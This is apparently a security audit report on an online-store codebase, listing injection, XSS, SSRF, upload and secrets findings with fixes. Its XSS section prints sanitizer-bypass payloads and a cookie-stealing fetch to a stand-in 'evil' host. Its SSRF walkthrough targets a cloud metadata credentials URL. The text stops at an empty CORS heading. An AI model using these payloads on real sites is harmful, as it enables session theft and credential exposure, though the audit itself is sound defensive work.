# PHASE 12 — SECURITY FORENSIC AUDIT (OWASP Top 10 + Platform)

**Repo:** `Letbuyy_Store` | **Audit date:** 2026-06-10
**Auditor:** Cloudflare/OWASP-grade application-security forensic audit, code-only working-tree analysis
**Scope:** the OWASP Top 10 (2021) and platform attack surface that prior phases did **not** deeply cover — injection (SQLi beyond RLS, SSTI, command/template), XSS (storefront stored-XSS to buyers, theme/app/email render, CSP), SSRF (webhook/media/theme/OAuth fetch), file upload/media signing, secrets management, inbound/outbound webhook security, API security (IDOR, mass-assignment, CORS, security headers, rate-limiting, GraphQL), cryptography, dependencies/supply chain, CI/CD & infra, and DoS/abuse — **plus a unified cross-phase S0–S3 ranking of every security finding across all 12 phases.**
**Constitution baseline:** `LETBUYY_EXECUTABLE_ARCHITECTURE_V1.md` §3/§6/§8 (validated-claims tenancy, field-level PII encryption + KMS, webhook HMAC + timestamp + nonce-replay, fail-closed isolation, ban silent success).

### Prior phases read and cross-linked (IDs reused, not re-derived)

- `REPO_TOPOLOGY_AUDIT.md` (Phase 1) — TOPO-001…008 (2×S0)
- `ARCHITECTURE_COMPLIANCE_AUDIT.md` (Phase 2) — ARCH-001…008
- `FOUNDATION_AUDIT.md` (Phase 3) — FND-001…006 (6×S0 RLS leaks), FND-007…025
- `PAYMENTS_FORENSIC_AUDIT.md` (Phase 4) — PAY/F-class money findings
- `CHECKOUT_FORENSIC_AUDIT.md` (Phase 5) — CHK-001…019
- `AUTH_FORENSIC_AUDIT.md` (Phase 6) — AUTH-001 (S0 switch takeover), AUTH-002 (shared `AUTH_SECRET`), AUTH-003…015
- `DATABASE_FORENSIC_AUDIT.md` (Phase 7) — DB-001…034

### Methodology

Evidence-only. Every NEW finding carries a `path:line` anchor and quoted code, an explicit OWASP category, a concrete exploit walkthrough where exploitable, and an S0–S3 severity. Severity rubric: **S0** = critical, exploitable now, leads to money movement / mass data exposure / account or platform takeover; **S1** = high, serious exposure one trigger away or requiring a plausible precondition; **S2** = medium, real but bounded; **S3** = low / hardening / defense-in-depth. Claims that depend on live runtime, deployed env-var values, or PostgREST GRANT state (not provable from source) are marked **UNVERIFIED**. No code was modified.

---

## 1. Executive Verdict & Security Posture Score

**LetBuyy's application-security engineering is genuinely above-average in the *plumbing* and genuinely dangerous in the *blast radius*.** The controls that a competent team builds first are here and mostly correct: a strict CORS allowlist (not a reflector), a real fail-closed token-bucket rate limiter, a global egress error-sanitizer that strips Postgres internals, HMAC-verified inbound payment webhooks, a SHA-256-gated WASM module fetch, least-privilege `contents: read` CI tokens, an actively-maintained `pnpm.overrides` CVE-pinning block, `onlyBuiltDependencies` locking down install scripts, and a CSP/HSTS/X-Content-Type-Options header set on every Next.js app. None of that is theater.

But three structural decisions turn that B+ surface into a platform whose worst case is **stored cross-site-scripting against every buyer on the platform, executed under a CSP that cannot stop it**, layered on top of the two account/platform-takeover S0s the prior phases already found:

1. **The storefront renders merchant- and theme-author-controlled HTML to buyers through a hand-rolled regex "sanitizer" that is trivially bypassable** (`<svg/onload=…>`, `<img src=x onerror=…>` across attributes, `srcdoc`, `<style>`, `formaction`), and there is **no DOMPurify / sanitize-html anywhere in the repository** (SEC-001, S1 — would be S0 with a confirmed injection sink reaching it). The Liquid engine is configured **without output auto-escaping**, so `{{ product.description }}` emits raw HTML by design and the regex blocklist is the *only* line of defense.
2. **The platform CSP allows `script-src 'unsafe-inline'`** on every app including the storefront (SEC-002, S2), so even when the XSS fires, the CSP — the one mitigation that should contain a sanitizer bypass — provides zero script-execution protection. The two findings compound: SEC-001 is the wound, SEC-002 removes the tourniquet.
3. **The outbound webhook dispatcher fetches any merchant-supplied HTTPS URL with no internal-IP / metadata-endpoint blocklist and returns a 2 KB response preview to the caller** (SEC-006, S1) — a full SSRF-with-exfiltration primitive driven by an attacker-controlled config field, on the Cloudflare-Workers and (where applicable) cloud-metadata surface.

Underneath those, the cross-phase picture is dominated by issues *already* registered: **9 S0s across the whole audit**, of which **6 are the FOUNDATION RLS-to-PUBLIC `USING(true)` leaks** (anon read/write of every tenant's products/orders/sites/customers/billing, and self-grant of platform super-admin), **1 is the `/api/auth/switch` unauthenticated account takeover** that is *fixed only in the uncommitted working tree* (so every deployable branch is exploitable), and **1 is the production deploy branch being 30 commits behind** (so none of the remediation has shipped). The shared-secret HS256 architecture (AUTH-002) is the connective tissue: because every token is symmetric, the verification key is the forgery key, and a single `AUTH_SECRET` leak forges console sessions, checkout grants, media-upload tickets, and webhook-internal auth at once.

PII protection is the quietest catastrophe: **V1 mandates field-level PII encryption with a KMS, and the KMS is a mock** (`createMockKmsProvider`, hardcoded envelope secret; `createLiveKmsProvider` is a `SKIP_NEEDS_HUMAN_` skeleton) — so customer name/phone/address sit in plaintext columns that FND-004 shows are anon-readable. The constitution's strongest data-protection promise is unimplemented.

**Overall security posture score: 2.4 / 5.0 ("REQUIRES REMEDIATION BEFORE LIVE").**

Justification: the median control is well-built (which keeps this off the floor), but the score is dragged down by (a) a stored-XSS-to-buyers path with a broken sanitizer and a neutered CSP, (b) an SSRF-with-exfiltration primitive on a merchant-config field, (c) mock-only PII encryption against a constitution that requires real KMS, and (d) the inherited 9 S0s — six of which are *live on every branch* (the RLS leaks) and two of which are *fixed only in an uncommitted tree*. The number cannot rise above "requires remediation" while a verified-email account-takeover and anon super-admin self-grant are both reachable on production today. The cryptographic kernel and the egress/CORS/CI controls are the reasons it is 2.4 and not 1.5.

---

## 2. OWASP Top 10 (2021) Coverage Table

| # | Category | Status | Worst finding (this phase + cross-phase) |
|---|----------|--------|------------------------------------------|
| **A01** | Broken Access Control | **FAIL (S0)** | FND-001…006 RLS-to-PUBLIC `USING(true)` (anon read/write all tenants + self-grant super-admin); AUTH-001 `/api/auth/switch` takeover; SEC-006 SSRF; SEC-013 wasm/extension SSRF. IDOR is *mostly* closed by `verifySiteOwnership`/`verifyStoreOwnership` on first-party routes (positive). |
| **A02** | Cryptographic Failures | **FAIL (S1)** | SEC-014 PII KMS is mock-only (constitution requires real field-level encryption); AUTH-002 shared `AUTH_SECRET` HS256 = verification key is forgery key; AUTH-014 `lb_accounts` "encrypted" cookie is signed-but-plaintext PII. Token alg-pinning and bcrypt-12 are correct (positive). |
| **A03** | Injection | **PARTIAL (S1)** | SEC-001 stored XSS via theme/product HTML through a regex sanitizer (no DOMPurify); SEC-004 theme-marketplace JSON-LD unescaped breakout. **No SQLi** found beyond RLS (all DB access is parameterized PostgREST / `.rpc()`; no template-literal SQL in app/service code). **No command injection** in runtime code. SSTI is contained by liquidjs sandbox limits (positive). |
| **A04** | Insecure Design | **FAIL (S0/S1)** | Two-parallel-systems pattern (ARCH/AUTH/DB): legacy un-ledgered money paths, legacy Supabase-auth surface bypassing hardened sessions (AUTH-010/011), service_role bypassing RLS as the *design* (DB-004), step-up that is a string-length check (PAY F8). |
| **A05** | Security Misconfiguration | **FAIL (S2)** | SEC-002 CSP `script-src 'unsafe-inline'`; SEC-003 input-validation WAF that logs-but-never-blocks; SEC-016 `.env.local` committed-in-tree-shape (verified untracked + gitignored — benign) with a single reused dev secret; SEC-005 deprecated `X-XSS-Protection` header. Header baseline is otherwise strong (positive). |
| **A06** | Vulnerable & Outdated Components | **PASS (S3)** | SEC-021 dual `bcryptjs` versions (2.4.3 + 3.0.3) only finding; `pnpm.overrides` actively pins CVE'd `hono`/`undici`/`minimatch`/`picomatch`/`defu`/`fast-uri`/`socket.io-parser`; `onlyBuiltDependencies` restricts install scripts. Strong supply-chain posture. |
| **A07** | Identification & Authentication Failures | **FAIL (S0)** | AUTH-001 takeover (undeployed fix); AUTH-003 anon super-admin self-grant; AUTH-004 client-writable role fallback; AUTH-005 JS-readable CSRF across parent-domain subdomains. Crypto-secure RNG used for all OTP/TOTP/codes (positive — no `Math.random` in security paths). |
| **A08** | Software & Data Integrity Failures | **PARTIAL (S1)** | CHK-001 signed `checkout_url` does not bind cart contents; ARCH-004 non-atomic outbox dual-write (event loss); DB-009 ledger append-only is trigger-only (no REVOKE). WASM module fetch is SHA-256-integrity-checked (positive). Deployment signing/SBOM is documented-but-unenforced in workflow (SEC-022). |
| **A09** | Security Logging & Monitoring Failures | **PARTIAL (S2)** | SEC-017 dangerous-input detections are logged but never alerted/blocked; webhook DLQ/poisoning telemetry exists but no replay-poison guard (SEC-009). Structured JSON logging + `security_enforcement_events` table exist (positive). |
| **A10** | Server-Side Request Forgery | **FAIL (S1)** | SEC-006 outbound app-lifecycle webhook → any HTTPS host, no SSRF guard, response preview exfiltrated; SEC-013 wasm-module / app-bridge fetch to developer-controlled URL (digest-checked bytes, but the *request* still reaches internal hosts). DoH resolver is fixed-host (positive). |

---

## 3. Injection (A03) — SQLi beyond RLS, SSTI, command/template

### 3.1 SQL injection beyond RLS — **NOT FOUND (positive)**

A full sweep for raw SQL string-building in the application/service layer (`query(` + var, template-literal SQL, `.rpc()` with interpolated SQL) returns no injectable sink. Every database touch is either:
- the Supabase JS client (`db.from(table).select(...).eq(col, value)`) — parameterized PostgREST, values bound not concatenated; or
- a named `.rpc('fn_name', { p_… })` — arguments are JSON-encoded parameters, not SQL text.

The closest things to dynamic SQL are **inside trusted migrations** (`format('ALTER TABLE public.%I ENABLE …')` dynamic loops in migrations 139/151/152/153/160, per Phase 3) — these use `%I` identifier quoting over a fixed table list, not user input. The `media.ts` search builds a PostgREST `.or()` filter (`media.ts:217-218`) but **strips `%(),` first** (`q.search.replace(/[%(),]/g, '')`) before interpolating into the `ilike` filter — a deliberate PostgREST-filter-injection guard. **No SQLi class risk in code.** (RLS/tenant-isolation defects are A01, covered by FND-001…006.)

### 3.2 Server-Side Template Injection (SSTI) — **CONTAINED (S3, SEC-015)**

The storefront renders **merchant- and theme-author-authored Liquid templates** via `liquidjs` (`theme-renderer.ts:1,255`). Liquid is a logic-limited template language, and the engine is hardened: `ownPropertyOnly: true` (blocks prototype-chain traversal), `jsTruthy: false`, `parseLimit: 300_000`, `renderLimit: 250`, `memoryLimit: 2_000_000`, `strictFilters: true`, `dynamicPartials: false` (`theme-renderer.ts:256-264`). `dynamicPartials:false` is the load-bearing control — it prevents `{% include variable %}` from rendering an attacker-named partial, closing the main Liquid-SSRF/LFI vector. **SEC-015 (S3):** the residual risk is filter/drop abuse and the fact that templates are author-controlled at all; the real exposure is not template *execution* but template *output* (raw HTML — see SEC-001). Accept with monitoring; the sandbox is correctly configured.

### 3.3 Command injection — **NOT FOUND (positive)**

No `child_process` / `exec` / `spawn` / `execFile` in any runtime path (`services/`, `apps/*/src`, `packages/`). The only `.exec(` hits are `RegExp.prototype.exec` in the GraphQL cost shim (`graphql/cost.ts`, `graphql/admin.ts`) — string parsing, not OS commands.

---

## 4. Cross-Site Scripting (A03/A07) — the storefront stored-XSS surface

This is the most consequential NEW finding cluster in the phase. **There is no DOMPurify, sanitize-html, or any vetted HTML-sanitization library anywhere in the repository** (verified: zero matches in all `package.json` and all source). Every HTML-injection defense is a hand-rolled regex.

### 4.1 SEC-001 (S1) — storefront theme render: raw HTML through a bypassable regex blocklist

**Sink.** `apps/storefront-runtime/src/lib/theme-engine/composition-engine.tsx:84` renders the full Liquid output to buyers:

```tsx
<div data-theme-renderer="liquid" data-editor-mode={…}
     dangerouslySetInnerHTML={{ __html: html }} />
```

**Source.** The `html` is `result.liquid.contentForLayout` — Liquid templates rendering commerce drops including `product.description` (`composition-engine.tsx:239` `description: product.description`), shop name, collection titles, and app-block content. The Liquid engine has **no `outputEscape`** set (`theme-renderer.ts:255-274`), so liquidjs's default applies: **`{{ … }}` is NOT auto-escaped** (unlike Shopify-hosted Liquid). A theme that prints `{{ product.description }}` emits whatever HTML the merchant stored in the product description.

**The only defense.** `sanitizeRenderedHtml` (`theme-renderer.ts:606-611`):

```ts
function sanitizeRenderedHtml(html: string): string {
  return html
    .replace(/<script\b[\s\S]*?<\/script>/gi, '')
    .replace(/\son[a-z]+\s*=\s*("(?:[^"]*)"|'(?:[^']*)'|[^\s>]+)/gi, '')
    .replace(/\s(href|src)\s*=\s*("(?:\s*javascript:|\s*data:text\/html)[^"]*"|'(?:\s*javascript:|\s*data:text\/html)[^']*')/gi, '');
}
```

**This is a blocklist, not a sanitizer, and is bypassable on first principles:**

| Bypass payload | Why the regex misses it |
|---|---|
| `<svg/onload=alert(document.cookie)>` | The event-handler regex requires **whitespace** before `on` (`\son[a-z]+`); `/` is not whitespace. |
| `<img src=x onerror=alert(1)>` written as `<img/src=x/onerror=alert(1)>` | Same `/`-instead-of-space bypass on both attribute and handler. |
| `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">` | `srcdoc` is neither `href` nor `src`; the `<script>` is HTML-entity-encoded inside the attribute and decodes inside the iframe. |
| `<a href="java&#115;cript:alert(1)">` | The `javascript:` literal is broken by an HTML entity; the `href` regex matches the literal string `javascript:`, not the entity form. |
| `<form action=javascript:alert(1)><button>` / `<button formaction=javascript:alert(1)>` | `formaction`/`action` are not in the `(href|src)` allowlist. |
| `<style>@import 'https://evil/x.css'</style>` / CSS `expression()` | No `<style>` handling at all. |
| `<base href="https://evil/">` | No `<base>` handling — rewrites every relative URL on the page. |
| `<scr<script>ipt>alert(1)</script>` | Single-pass, non-recursive `<script>…</script>` removal can leave a reconstructed tag after one substitution. |

**Exploit walkthrough (stored XSS, merchant → every buyer):**
1. Merchant (or a compromised/low-trust seller account) edits a product description to `<img/src=x/onerror="fetch('https://evil/c?'+document.cookie)">` via the product API.
2. The value is stored in `products.description` and flows into the Liquid `product` drop.
3. Any buyer visiting `/store/<sub>/product/<id>` (a public, unauthenticated, cached page — `revalidate = 30`) receives the rendered HTML; `sanitizeRenderedHtml` does not strip the slash-delimited handler; React injects it via `dangerouslySetInnerHTML`.
4. The buyer's browser executes attacker JS in the storefront origin — session/customer-cookie theft, fake checkout overlay, card-skimmer injection.

Because storefront pages are **cached and served to all buyers**, this is *stored* XSS with platform-wide buyer reach. **Severity S1** today (it requires the attacker to be a merchant on the platform, and Phase 5/6 note storefronts use host-only customer cookies that limit cross-realm theft) — **but it is one step from S0**: the same sink also renders **app-block** content (`renderLiquidAppBlockHtml`, which *does* escape, `composition-engine.tsx:91-127`) and any future field that reaches Liquid un-escaped; and a self-XSS in the theme editor preview (`editorMode`) escalates to the merchant's own admin session.

**Note:** `renderLiquidAppBlockHtml` (`composition-engine.tsx:100-127`) and `escapeHtmlAttribute` (`theme-renderer.ts:613`) *do* HTML-escape their inputs correctly — so app blocks are safe. The hole is specifically the **Liquid `{{ }}` output path** + the **regex post-filter**.

### 4.2 SEC-004 (S2) — theme-marketplace JSON-LD `<script>` breakout (stored XSS)

`apps/theme-marketplace/src/app/themes/[slug]/page.tsx:451-454`:

```tsx
<script type="application/ld+json"
        dangerouslySetInnerHTML={{ __html: JSON.stringify(structuredData) }} />
```

`structuredData` embeds developer-controlled `theme.name` and `theme.description` (`:426-427`). Unlike the storefront product page (`product/[productId]/page.tsx:72`, which does `.replace(/</g, '\\u003c')`) and app-marketplace (`apps/[slug]/page.tsx:307`, also `.replace(/</g, …)`), the **theme-marketplace page does not escape `<`**. A theme author who sets a theme name/description containing `</script><script>alert(document.cookie)</script>` breaks out of the JSON-LD block and injects script into the public theme listing page. **Stored XSS, S2** (audience = theme-marketplace browsers, including merchants evaluating themes). **Fix (S):** mirror the `.replace(/</g, '\\u003c')` used on the other two pages.

### 4.3 XSS register

| ID | App / sink | Source | Escaped? | Severity |
|---|---|---|---|---|
| SEC-001 | storefront `composition-engine.tsx:84` | Liquid output incl. `product.description` | regex blocklist (bypassable) | **S1** |
| SEC-004 | theme-marketplace `[slug]/page.tsx:453` | `theme.name`/`description` in JSON-LD | **NO** | **S2** |
| — | storefront `product/[productId]/page.tsx:72` | JSON-LD | YES (`\\u003c`) | OK |
| — | app-marketplace `apps/[slug]/page.tsx:307` | JSON-LD | YES (`\\u003c`) | OK |
| — | app blocks `composition-engine.tsx:100-127` | block content | YES (`escapeHtml`) | OK |
| — | `layout.tsx` (`<style>` dSIH, all apps) | static CSS string, no interpolation | n/a | OK |

---

## 5. CSP & Security Headers (A05)

### 5.1 SEC-002 (S2) — CSP `script-src 'unsafe-inline'` neuters XSS containment

`config/security/next-security-headers.ts` (used by all 9 apps via `createSecurityHeaders()`):

```ts
const scriptSrc = unique([
  "'self'",
  "'unsafe-inline'",                                   // ← removes the XSS tourniquet
  ...(isDevelopmentRuntime() ? ["'unsafe-eval'"] : []),
  'https://challenges.cloudflare.com',
]);
```

`'unsafe-inline'` in `script-src` means an injected `<script>alert(1)</script>` or inline event handler that bypasses SEC-001's regex **executes freely** — the CSP provides no script-execution defense. This is the difference between SEC-001 being "annoying but CSP-contained" and "fully exploitable." The same applies to `style-src 'unsafe-inline'` (enables CSS-injection data-exfil). **Fix (M):** move to nonce/hash-based `script-src` (Next.js supports per-request nonces); the JSON-LD `<script type="application/ld+json">` blocks and the `layout.tsx` `<style>` need nonces, not a global `'unsafe-inline'`.

### 5.2 The rest of the header set is strong (positive)

`createSecurityHeaders()` correctly emits, on every page of every app: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options` (DENY/SAMEORIGIN), `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(self)`, and a CSP with `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`, `frame-ancestors` from env. The api-gateway adds its own restrictive `default-src 'none'; frame-ancestors 'none'` for API responses (`middleware/security.ts:29`). **SEC-005 (S3):** `X-XSS-Protection: 1; mode=block` (`security.ts:23`) is a deprecated header that can *introduce* vulns in legacy browsers; modern guidance is `0` (rely on CSP). Cosmetic.

---

## 6. SSRF (A10)

### 6.1 SEC-006 (S1) — outbound app-lifecycle webhook is a merchant-driven SSRF with response exfiltration

`services/webhook-service/src/app-lifecycle-dispatch.ts:34-41`:

```ts
function isValidAppLifecycleTarget(targetUrl: string): boolean {
    try {
        const url = new URL(targetUrl);
        return url.protocol === "https:" && url.hostname.length > 0;   // ← entire SSRF guard
    } catch { return false; }
}
```

The **only** validation on the outbound `target_url` is "is HTTPS and has a hostname." There is **no blocklist for**:
- loopback / link-local: `https://127.0.0.1`, `https://[::1]`, `https://169.254.169.254` (cloud metadata), `https://metadata.google.internal`
- RFC-1918 private ranges: `https://10.x`, `https://192.168.x`, `https://172.16.x`
- DNS-rebinding (a public hostname that resolves to an internal IP at fetch time)

And critically, the function **returns a 2 KB preview of the response body to the caller** (`readPreview`, `app-lifecycle-dispatch.ts:43-46,106`), and the dispatch result (`status`, `response_preview`) is surfaced via `POST /app-lifecycle/dispatch` (`index.ts:583-589`). **This is SSRF with exfiltration**, not blind SSRF.

**Exploit walkthrough:**
1. The dispatch is gated by an internal dispatch secret (`index.ts:565-569`), so the *direct* HTTP entry requires that secret. However the `target_url` originates from **merchant-configured app webhook endpoints** persisted in the DB (`app_webhooks` / lifecycle subscriptions) and replayed by `dispatchWebhookDeliveries` (`index.ts:596-608`) — so a merchant/app-developer controls `target_url` through normal product configuration, and the worker performs the fetch on their behalf.
2. Attacker registers an app webhook target of `https://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` (AWS) or an internal Supabase/Cloudflare service URL.
3. The worker fetches it and stores/returns up to 2000 chars of the response.
4. If the runtime has a reachable metadata or internal admin endpoint, the attacker reads it.

**Caveat (UNVERIFIED, environment-dependent):** on Cloudflare Workers the AWS-style `169.254.169.254` IMDS is *not* present, and Workers egress is somewhat constrained; the practical blast radius depends on what internal hosts are reachable from the Worker's egress (Supabase URL, internal service bindings, Hyperdrive, any self-hosted endpoints). The **code defect is unconditional**; the live impact is environment-gated. **Fix (M):** resolve the hostname, reject any target resolving to private/loopback/link-local/ULA ranges (and re-check after redirects / pin DNS), drop the response-preview echo, and allowlist by registered-app domain.

### 6.2 SEC-013 (S2) — WASM-module & app-bridge fetch to developer-controlled URL

- `services/api-gateway/src/extensions/app-functions-runtime.ts:361` fetches `registration.wasm_module_url` (developer-supplied at app-function registration). The *bytes* are SHA-256-verified against `registration.wasm_sha256` (`:367-369`) — so a tampered body is rejected — **but the GET request itself still reaches whatever host the URL names**, including internal endpoints, before any digest check. SSRF-by-request (no exfil; the function aborts on digest mismatch, and there's a timeout via `AbortController`).
- `services/api-gateway/src/routes/app-store/extension-routes.ts:481` fetches `targetUrl` from `bridgeTargetUrl(c.req.url, bridgeRequest.path, …)` (`:430`) — this is **constructed server-side from the gateway's own origin + a path**, so it is *not* a free-form SSRF (positive); the path is scope-checked (`bridgeRequiredScopes`, `:410`).

**Fix (S):** apply the same private-IP blocklist to `wasm_module_url` fetches; require the module URL to be on a platform-owned R2/CDN origin.

### 6.3 SSRF non-findings (positive)

`services/api-gateway/src/lib/dns.ts` resolves DoH against **two fixed resolvers** (`cloudflare-dns.com`, `dns.google`) with the user domain only as a query param — not SSRF. The rate-limiter's Upstash fetch (`rateLimit.ts:204,694`) uses the configured `redisUrl` env (not user input).

---

## 7. File Upload / Media (A01/A08)

### 7.1 SEC-007 (S2) — no content-type allowlist; SVG/HTML uploads classified as servable media (stored-XSS feeder)

`services/api-gateway/src/routes/media.ts` signed-upload schema (`:44-52`) accepts **any** `content_type` string up to 160 chars; the `POST /media` registration (`:341-346`) classifies but never rejects a MIME type. `mediaAssetTypeForContent` (`storage-adapter/index.ts:64`) explicitly maps `image/svg+xml` and `.svg` to `assetType: 'image'`. **An uploaded SVG can carry `<script>`**; if served from a same-origin path (or a path the storefront frames/inlines), it becomes stored XSS. There is **no extension allowlist, no magic-byte check, no `image/svg+xml` rejection, no `Content-Disposition: attachment` / `image/svg+xml`-neutralizing for served objects.** **Fix (S):** allowlist content types; reject `image/svg+xml` and `text/html`; serve user media from a cookieless asset domain with `X-Content-Type-Options: nosniff` and (for SVG) sanitize or force-download.

### 7.2 SEC-008 (S2) — media-upload signing secret falls back to `AUTH_SECRET` (forgeable ticket; cross-link AUTH-002)

`media.ts:59-64`:

```ts
function mediaUploadSigningSecret(env): string | null {
    const configured = env.MEDIA_UPLOAD_SIGNING_SECRET || env.AUTH_SECRET;   // ← shared-secret fallback
    …
    return 'letbuyy-local-mock-media-upload-secret';                          // dev only
}
```

The upload ticket is `base64url(payload).hmacSha256(secret, payload)` (`:73-86`). If `MEDIA_UPLOAD_SIGNING_SECRET` is unset, the ticket is signed with `AUTH_SECRET` — the same key that (per AUTH-002) signs console sessions, checkout grants, and webhook-internal auth. A single `AUTH_SECRET` disclosure lets an attacker **forge a media-upload ticket for any `site_id`** and write into any tenant's media prefix. This is exactly the shared-secret blast-radius AUTH-002 describes, instantiated on a storage-write surface. **Fix (S):** make `MEDIA_UPLOAD_SIGNING_SECRET` mandatory (fail-closed when unset in production, as the console secret already does).

### 7.3 Path-traversal & cross-prefix write — **MITIGATED (positive, with a nit)**

`planSignedR2UploadIntent` builds `objectKey = ${folder}/${siteId}/${intentId}-${filename}` (`storage-adapter/index.ts:76`). `safeFilename` strips all `/` (`:57-58`), and the `siteId` segment is **server-injected from the ownership-checked `input.site_id`** (`media.ts:259` `verifySiteOwnership`), so a merchant cannot redirect the write into another tenant's `siteId` segment. **SEC-018 (S3 nit):** `safePathPart` (`:47-55`) keeps `.` in its allowlist `[a-zA-Z0-9._/-]`, so a `folder` of `../victim` survives cleaning as `../victim`; the resulting key is `../victim/<attackerSiteId>/…`. In R2, keys are **opaque flat strings** (no filesystem traversal), so this does *not* escape a prefix at the storage layer, but it is a code smell and would matter if these keys were ever joined into a real path. Reject `..` segments. **Cross-tenant write requires forging the signing ticket → back to SEC-008/AUTH-002.**

### 7.4 Ownership is enforced on every media mutation (positive)

`GET/POST/PATCH/DELETE /media` and `/media/signed-upload` all call `verifySiteOwnership(db, …, customUser.id, auth.user.storeId)` before acting (`media.ts:203,259,337,415,457`). No IDOR on media.

---

## 8. Secrets Management (A02/A05)

### 8.1 SEC-016 (S3) — `.env.local` present in all 9 apps, but verified **untracked + gitignored** (benign)

`apps/*/.env.local` exist on disk for all nine apps, **but `git ls-files` returns none of them** and `.gitignore:88-89` (`.env.local`, `**/.env.local`) excludes them. They are auto-generated dev files (`setup-local-env.mjs`, header: "Untracked by design… Do NOT commit") holding only placeholder values: the Supabase **demo** anon JWT, Turnstile **test** key `1x00000000000000000000AA`, `rzp_test_localdev`, and a single dev secret `letbuyy_local_dev_only_secret_change_me_please`. **No real secret is committed.** Recorded as S3 because the *pattern* is fragile (one `git add -f` leaks the shape) and because every dev secret is **the same string reused across `AUTH_SECRET` / `CSRF_SECRET` / `PREVIEW_SIGNING_KEY` / `STORE_ACCESS_SIGNING_KEY` / `CUSTOMER_SESSION_SECRET` / `INTERNAL_API_SECRET`** — a concrete demonstration of the AUTH-002 shared-secret hazard in the dev profile, and a reminder that the prod separation is *configuration-dependent*.

### 8.2 SEC-019 (S3) — no hardcoded production secrets in source (positive)

A sweep for secret-shaped literals (`(secret|password|apiKey|token|private_key) = "<16+ chars>"`) across `services/`, `apps/`, `packages/` returns **no committed production secret, key, or token**. The only literal "secrets" are the documented **mock/dev** values (`letbuyy-local-mock-kms-envelope-secret`, `letbuyy-local-mock-media-upload-secret`, TOTP demo `JBSWY3DPEHPK3PXP`, console dev MFA `000000`) and the `SKIP_NEEDS_HUMAN_*` placeholder sentinels for live credentials. `infrastructure/security/production-security-controls.yaml` formally lists service-role keys / webhook secrets / provider tokens / customer-session secrets as `forbiddenInRepository` and the scan confirms compliance.

### 8.3 SEC-020 (S2) — `NEXT_PUBLIC_*` surface review: anon key + Razorpay key_id only (acceptable)

Client-bundle-exposed env (`NEXT_PUBLIC_*`) is limited to public-by-design values: Supabase **anon** key (public by design; the risk is the RLS leaks FND-001…006, not the key), `NEXT_PUBLIC_RAZORPAY_KEY_ID` (the publishable key_id, not the secret), Turnstile **site** key, and origin URLs. **No service_role key, no Razorpay key_secret, no `AUTH_SECRET`** is `NEXT_PUBLIC_`. The one watch-item: `NEXT_PUBLIC_LETBUYY_ENABLE_DEV_AUTH_BYPASS=true` ships in the *dev* env; the bypass itself is triple-gated to local runtime (`dev-auth-bypass.ts`, per AUTH audit), so this is benign in prod. Recorded S2 only as a reminder to keep the dev-bypass flag out of any production Vercel project env.

---

## 9. Webhooks (inbound + outbound)

### 9.1 Inbound signature verification — **CORRECT per provider (positive)**

| Provider | Verify location | Algorithm | Timing-safe? | Fail-closed? |
|---|---|---|---|---|
| Razorpay | `webhook-service/src/index.ts:222-230` | HMAC-SHA256 over raw body, header `x-razorpay-signature` | **yes** (`timingSafeEqual`) | yes (missing sig/secret → false) |
| Stripe | `:866-883` (provider adapter) | Stripe signature scheme | yes | yes |
| Cashfree | `:1203-1222` | base64(HMAC-SHA256(timestamp+rawBody)) | yes | yes |
| PayPal | `:238-249` | webhook-id + transmission verify | yes | yes (creds required) |
| WhatsApp | gateway `whatsapp.ts:559-566,794-796` | adapter `verifyInboundWebhook` (Meta SHA1/SHA256) | yes | yes (401 on invalid) |

Replay dedup is enforced by the `payment_webhook_events (provider, provider_event_id)` UNIQUE upsert (Phase 4 finding). **Inbound is solid.**

### 9.2 SEC-009 (S2) — outbound HMAC has timestamp + nonce but **no replay-window enforcement on the receiver contract; age not rejected on inbound**

The **outbound** LetBuyy webhook (`app-lifecycle-dispatch.ts:79-105`) correctly stamps `X-LetBuyy-Timestamp`, `X-LetBuyy-Nonce`, and `v1=` HMAC over `timestamp.body` — matching V1's HMAC+timestamp+nonce requirement. But the corresponding **inbound** payment-webhook path explicitly **does not reject by age** (Phase 4: `index.ts:714-719` "do not reject by age"), so a captured provider webhook can be replayed indefinitely; only the dedup UNIQUE saves it (and a crash after the dedup row is written strands the event). **DLQ poisoning (SEC-009 cont.):** `dispatchWebhookDeliveries` claims and retries deliveries (`index.ts:596-608`) but there is no poison-message cap / quarantine on a target that always errors — a permanently-failing merchant endpoint re-consumes retry budget. **Fix (M):** enforce a timestamp tolerance on inbound; add a max-attempts → DLQ quarantine on outbound.

### 9.3 SEC-006 (the outbound SSRF) is the dominant webhook risk — see §6.1.

---

## 10. API Security (A01/A05)

### 10.1 IDOR / missing authz — **mostly closed on first-party routes (positive)**, latent class risk inherited

Sampled object-by-ID routes (media, whatsapp, orders, payouts, settlements, stores) consistently re-resolve ownership via `verifySiteOwnership` / `verifyStoreOwnership` / `resolveOwned*Store` before acting (e.g. `media.ts:415,457`; `whatsapp.ts:573,585,597`). Phase 3 confirmed no first-party route trusts a forged `store_id` without an ownership check. The **latent** IDOR is the tenant-guard's "presence not correctness" gap (FND-012) and the registry-only coverage (FND-013) — a *future* route that does `.eq('store_id', clientId)` without the ownership call would pass the guard. **Class risk, not a confirmed live route bypass.** Carried as cross-phase FND-012/013.

### 10.2 Mass assignment — **NOT FOUND (positive)**

The two `…spread into insert` sites both spread **explicitly-constructed object literals**, not `req.body`:
- `cart-routes.ts:419` `.insert({ ...payload, session_id })` — `payload` is a whitelisted literal (`:393-403`).
- `metafields.ts:465` `.insert({ ...payload, created_by })` — `payload` is a whitelisted literal (`:445-453`).

The `PATCH /media/:id` route is a model of the correct pattern: an explicit `allowed = ['alt_text','caption','folder','tags','filename']` field-pick loop (`media.ts:419-423`). No `Object.assign(row, req.body)` anywhere. **No mass-assignment exposure.**

### 10.3 CORS — **CORRECT strict allowlist (positive)**

